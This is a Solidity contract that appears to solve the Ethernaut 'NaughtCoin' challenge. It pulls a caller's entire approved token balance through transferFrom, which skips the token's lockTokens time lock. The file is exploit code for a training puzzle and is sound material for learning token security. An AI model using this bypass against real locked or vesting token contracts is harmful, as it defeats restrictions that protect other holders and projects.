// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract NaughtCoinDrainer {
    /// @notice Drain *all* of msg.sender’s NaughtCoin to `recipient`
    /// @dev Before calling, msg.sender must have approved this contract for their full balance.
    function drain(address token, address recipient) external {
        IERC20 t = IERC20(token);

        // 1) How many tokens msg.sender owns
        uint256 bal = t.balanceOf(msg.sender);
        require(bal > 0, "no tokens to drain");

        // 2) Pull them out — bypasses lockTokens because this calls _transfer internally
        bool ok = t.transferFrom(msg.sender, recipient, bal);
        require(ok, "transferFrom failed");
    }
}
